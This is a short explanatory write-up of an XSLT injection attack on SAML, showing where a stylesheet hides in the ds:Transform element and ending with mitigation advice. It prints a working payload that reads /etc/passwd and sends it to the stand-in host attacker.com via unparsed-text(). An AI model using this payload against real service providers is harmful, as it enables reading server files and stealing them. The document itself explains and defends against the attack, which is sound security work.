# XSLT attack against SAML

Reproduction of the diagram showing an XSLT payload carried inside a SAML
assertion.

## Where the payload sits

```
saml:Response
└── saml:Assertion
    ├── saml:Subject
    │   └── Bob
    ├── ds:Signature
    └── ds:Transform
        └── [XSLT payload]  ──> executed by the service provider
```

The `ds:Transform` element inside the XML signature is meant to hold a
canonicalisation instruction. When the service provider processes the signature
it runs the transform, and if the transform body is an attacker-supplied
stylesheet, that stylesheet executes.

## The payload

```xml
<xsl:stylesheet xmlns:xsl="...">
    <xsl:template match="doc">
        <xsl:variable name="file"
            select="unparsed-text('/etc/passwd')"/>
        <xsl:variable name="escaped"
            select="encode-for-uri($file)"/>
        <xsl:variable name="attackerUrl"
            select="'http://attacker.com/'"/>
        <xsl:variable name="exploitUrl"
            select="concat($attackerUrl,$escaped)"/>
        <xsl:value-of
            select="unparsed-text($exploitUrl)"/>
    </xsl:template>
</xsl:stylesheet>
```

## Flow

1. The attacker crafts a SAML assertion whose `ds:Transform` step specifies an
   XSLT stylesheet.
2. The service provider validates the signature and executes the transform.
3. The stylesheet reads a sensitive local file with `unparsed-text('/etc/passwd')`.
4. The content is URL-encoded with `encode-for-uri()` so it survives as a query
   component.
5. The stylesheet requests `http://attacker.com/<encoded file>` with
   `unparsed-text()`, sending the file content to the attacker.

## Notes

`unparsed-text()` is the primitive that makes this work: it performs an outbound
fetch and returns the body as a string, so the same call both exfiltrates (when
given an attacker URL) and reads local files (when given a `file:` or absolute
path). Restricting the stylesheet to a known-good transform, or refusing
signatures whose `ds:Transform` is anything other than the canonicalisation
algorithms in the profile, removes the path.
